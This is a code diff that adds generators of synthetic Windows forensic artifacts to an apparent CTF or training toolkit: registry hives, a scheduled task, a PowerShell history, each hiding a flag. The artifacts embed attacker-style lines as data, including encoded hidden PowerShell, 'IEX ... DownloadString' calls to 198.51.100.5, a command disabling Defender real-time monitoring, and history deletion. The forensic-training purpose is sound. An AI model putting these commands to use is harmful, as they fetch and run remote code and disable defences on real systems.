@@ -413,6 +413,206 @@ def write_log_set(out_dir):
     return res
 
 
+# ---------------------------------------------------------------- Windows
+
+class RegfBuilder:
+    """Минимальный валидный куст regf: base block + один hbin с nk/vk/lh-ячейками.
+
+    keys: путь → [(имя, тип, bytes)]. Свободные ячейки (deleted=...) пишутся
+    с положительным размером — так выглядят удалённые значения.
+    """
+
+    def __init__(self, root_name="ROOT", hive_name="\\??\\C:\\test\\hive"):
+        self.root_name = root_name
+        self.hive_name = hive_name
+        self.keys = {"": []}
+        self.deleted = []
+
+    def key(self, path, values=()):
+        parts = [p for p in path.split("\\") if p]
+        for i in range(1, len(parts) + 1):
+            self.keys.setdefault("\\".join(parts[:i]), [])
+        self.keys["\\".join(parts)].extend(values)
+        return self
+
+    def deleted_value(self, name, vtype, data):
+        self.deleted.append((name, vtype, data))
+        return self
+
+    def build(self, ft=0x01DA75D1C0A2B000):
+        cells = bytearray()
+
+        def alloc(data, free=False):
+            size = (len(data) + 4 + 7) // 8 * 8
+            off = 32 + len(cells)
+            cells.extend(struct.pack("<i", size if free else -size) + data
+                         + bytes(size - 4 - len(data)))
+            return off
+
+        def patch(off, fmt, at, *vals):
+            struct.pack_into(fmt, cells, off - 32 + 4 + at, *vals)
+
+        def nk(name, parent, root=False):
+            nb = name.encode("latin-1")
+            body = struct.pack("<2sHQIIIIIIIIIIIIIIIHH", b"nk", 0x2C if root else 0x20, ft, 0,
+                               parent, 0, 0, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0xFFFFFFFF,
+                               0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0, 0, len(nb), 0) + nb
+            return alloc(body)
+
+        def vk(name, vtype, data, free=False):
+            nb = name.encode("latin-1")
+            if len(data) <= 4:
+                size, doff = len(data) | 0x80000000, struct.unpack("<I", data.ljust(4, b"\0"))[0]
+            else:
+                doff = alloc(data, free)
+                size = len(data)
+            return alloc(struct.pack("<2sHIIIHH", b"vk", len(nb), size, doff, vtype, 1, 0) + nb,
+                         free)
+
+        offs = {"": nk(self.root_name, 0xFFFFFFFF, root=True)}
+        for path in sorted(self.keys, key=lambda p: (p.count("\\"), p)):
+            if not path:
+                continue
+            parent = path.rsplit("\\", 1)[0] if "\\" in path else ""
+            offs[path] = nk(path.rsplit("\\", 1)[-1], offs[parent])
+        for path, vals in self.keys.items():
+            kids = sorted((p for p in self.keys if p and (p.rsplit("\\", 1)[0] if "\\" in p else "")
+                           == path), key=lambda p: p.rsplit("\\", 1)[-1].upper())
+            if kids:
+                ent = b""
+                for kp in kids:
+                    h = 0
+                    for ch in kp.rsplit("\\", 1)[-1].upper():
+                        h = (h * 37 + ord(ch)) & 0xFFFFFFFF
+                    ent += struct.pack("<II", offs[kp], h)
+                lst = alloc(struct.pack("<2sH", b"lh", len(kids)) + ent)
+                patch(offs[path], "<I", 20, len(kids))
+                patch(offs[path], "<I", 28, lst)
+            if vals:
+                vo = [vk(n, t, d) for n, t, d in vals]
+                vl = alloc(struct.pack(f"<{len(vo)}I", *vo))
+                patch(offs[path], "<I", 36, len(vo))
+                patch(offs[path], "<I", 40, vl)
+        for n, t, d in self.deleted:
+            vk(n, t, d, free=True)
+        hb_size = (32 + len(cells) + 8 + 4095) // 4096 * 4096
+        rest = hb_size - 32 - len(cells)
+        cells.extend(struct.pack("<i", rest) + bytes(rest - 4))
+        hbin = struct.pack("<4sIIQQI", b"hbin", 0, hb_size, 0, ft, 0) + bytes(cells)
+        base = bytearray(4096)
+        struct.pack_into("<4sIIQIIIIIII", base, 0, b"regf", 1, 1, ft, 1, 5, 0, 1,
+                         offs[""], hb_size, 1)
+        nm = self.hive_name.encode("utf-16-le")[:64]
+        base[48:48 + len(nm)] = nm
+        x = 0
+        for i in range(127):
+            x ^= struct.unpack_from("<I", base, i * 4)[0]
+        x = 0xFFFFFFFE if x == 0xFFFFFFFF else (1 if x == 0 else x)
+        struct.pack_into("<I", base, 508, x)
+        return bytes(base) + hbin
+
+
+def _sz(s):
+    return (s + "\x00").encode("utf-16-le")
+
+
+def _psenc(script):
+    return base64.b64encode(script.encode("utf-16-le")).decode()
+
+
+def make_system_hive(flag):
+    """SYSTEM: Select\\Current=1, служба с -enc в ImagePath (флаг) и нормальный драйвер."""
+    b = RegfBuilder("CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}")
+    b.key("Select", [("Current", 4, struct.pack("<I", 1)), ("Default", 4, struct.pack("<I", 1))])
+    b.key("ControlSet001\\Services\\Tcpip", [
+        ("ImagePath", 2, _sz("\\SystemRoot\\System32\\drivers\\tcpip.sys")),
+        ("Start", 4, struct.pack("<I", 0)), ("Type", 4, struct.pack("<I", 1))])
+    b.key("ControlSet001\\Services\\UpdSvc", [
+        ("ImagePath", 2, _sz("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
+                             f"-nop -w hidden -enc {_psenc('Write-Output ' + chr(39) + flag + chr(39))}")),
+        ("Start", 4, struct.pack("<I", 2)), ("Type", 4, struct.pack("<I", 16)),
+        ("ObjectName", 1, _sz("LocalSystem")), ("DisplayName", 1, _sz("Update Service"))])
+    b.key("ControlSet001\\Control\\Session Manager",
+          [("BootExecute", 7, _sz("autocheck autochk *") + b"\x00\x00")])
+    return b.build()
+
+
+def make_ntuser_hive(flag, deleted_flag):
+    """NTUSER.DAT: Run (подозрительный путь, флаг в REG_BINARY UTF-16), RunOnce, удалённое значение."""
+    b = RegfBuilder("ROOT")
+    run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    b.key(run, [("OneDrive", 1, _sz("C:\\Users\\u\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")),
+                ("Updater", 1, _sz("C:\\Users\\Public\\upd.exe /silent")),
+                ("Cfg", 3, ("cfg:" + flag).encode("utf-16-le"))])
+    b.key("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          [("cleanup", 1, _sz("cmd /c del C:\\Users\\Public\\upd.exe"))])
+    b.key("Environment", [("TEMP", 2, _sz("%USERPROFILE%\\AppData\\Local\\Temp"))])
+    b.key("Console", [])
+    b.deleted_value("Secret", 3, ("old:" + deleted_flag).encode("utf-16-le"))
+    return b.build()
+
+
+def make_task_xml(flag):
+    """XML задачи планировщика (UTF-16 с BOM, как в System32\\Tasks): -enc в аргументах."""
+    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>2024-03-14T09:20:00</Date><Author>WIN-TEST\\admin</Author>
+    <URI>\\Microsoft\\Windows\\UpdateCheck</URI></RegistrationInfo>
+  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger>
+    <TimeTrigger><StartBoundary>2024-03-14T09:30:00</StartBoundary>
+      <Repetition><Interval>PT15M</Interval></Repetition></TimeTrigger></Triggers>
+  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings><Hidden>true</Hidden></Settings>
+  <Actions Context="Author"><Exec><Command>powershell.exe</Command>
+    <Arguments>-NoP -W Hidden -EncodedCommand {_psenc("$f='" + flag + "'; IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a')")}</Arguments>
+  </Exec></Actions>
+</Task>
+"""
+    return b"\xff\xfe" + xml.encode("utf-16-le")
+
+
+def make_ps_history(flag):
+    lines = ["Get-ChildItem C:\\Users", "Set-MpPreference -DisableRealtimeMonitoring $true",
+             f"powershell -nop -enc {_psenc('Write-Output ' + chr(39) + flag + chr(39))}",
+             "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/r.ps1')",
+             "Remove-Item (Get-PSReadlineOption).HistorySavePath"]
+    return "\r\n".join(lines) + "\r\n"
+
+
+def write_win_set(out_dir):
+    """Кусты, задача, PS-история в папку-дамп. → {имя: (путь, флаг)}"""
+    cfg = os.path.join(out_dir, "Windows", "System32", "config")
+    tasks = os.path.join(out_dir, "Windows", "System32", "Tasks", "Microsoft", "Windows")
+    user = os.path.join(out_dir, "Users", "u")
+    psdir = os.path.join(user, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell",
+                         "PSReadLine")
+    for d in (cfg, tasks, psdir):
+        os.makedirs(d, exist_ok=True)
+    res = {}
+    f_sys = gen_flag("win_service")
+    p = os.path.join(cfg, "SYSTEM")
+    with open(p, "wb") as f:
+        f.write(make_system_hive(f_sys))
+    res["system"] = (p, f_sys)
+    f_run, f_del = gen_flag("win_run"), gen_flag("win_deleted")
+    p = os.path.join(user, "NTUSER.DAT")
+    with open(p, "wb") as f:
+        f.write(make_ntuser_hive(f_run, f_del))
+    res["ntuser"] = (p, f_run)
+    res["deleted"] = (p, f_del)
+    f_task = gen_flag("win_task")
+    p = os.path.join(tasks, "UpdateCheck")
+    with open(p, "wb") as f:
+        f.write(make_task_xml(f_task))
+    res["task"] = (p, f_task)
+    f_ps = gen_flag("win_pshistory")
+    p = os.path.join(psdir, "ConsoleHost_history.txt")
+    with open(p, "w", encoding="utf-8", newline="") as f:
+        f.write(make_ps_history(f_ps))
+    res["pshistory"] = (p, f_ps)
+    return res
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--out", required=True, help="папка для артефактов")
@@ -422,6 +622,8 @@ def main():
         manifest[k] = {"path": p, "flag": flag}
     for k, (p, flag) in write_log_set(os.path.join(a.out, "logs")).items():
         manifest["log_" + k] = {"path": p, "flag": flag}
+    for k, (p, flag) in write_win_set(os.path.join(a.out, "win")).items():
+        manifest["win_" + k] = {"path": p, "flag": flag}
     with open(os.path.join(a.out, "manifest.json"), "w", encoding="utf-8") as f:
         json.dump(manifest, f, ensure_ascii=False, indent=2)
     print(f"[+] {len(manifest)} артефактов в {a.out}")
